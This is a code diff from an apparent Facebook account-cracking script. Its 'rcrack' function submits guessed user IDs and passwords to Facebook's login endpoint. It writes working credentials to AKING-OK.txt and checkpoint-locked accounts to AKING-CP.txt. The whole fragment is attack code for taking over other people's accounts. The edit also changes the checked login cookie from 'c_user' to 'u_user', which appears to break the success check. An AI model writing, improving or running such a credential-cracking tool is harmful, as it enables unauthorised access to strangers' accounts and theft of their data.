@@ -422,19 +422,19 @@ def rcrack(uid,pwx,tl):
             lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
-            if 'c_user' in log_cookies:
+            if 'u_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[151:166]
-                print('\033[1;32m[AKING-OK] '+cid+'|'+ps+'\033[0;97m')
-                open('AKING-OK.txt', 'a').write(cid+' | '+ps+ '\n')
-                oks.append(cid)
+                uid = coki[151:166]
+                print('\033[1;32m[AKING-OK] '+uid+'|'+ps+'\033[0;97m')
+                open('AKING-OK.txt', 'a').write(uid+' | '+ps+ '\n')
+                oks.append(uid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[141:152]
-                print('\033[1;31m[AKING-CP] '+cid+' | '+ps+'\x1b[1;97m')
+                uid = coki[141:152]
+                print('\033[1;31m[AKING-CP] '+uid+' | '+ps+'\x1b[1;97m')
                 open('AKING-CP.txt', 'a').write(uid+' | '+ps+'\n')
-                cps.append(cid)
+                cps.append(uid)
                 break
             else:
                 continue
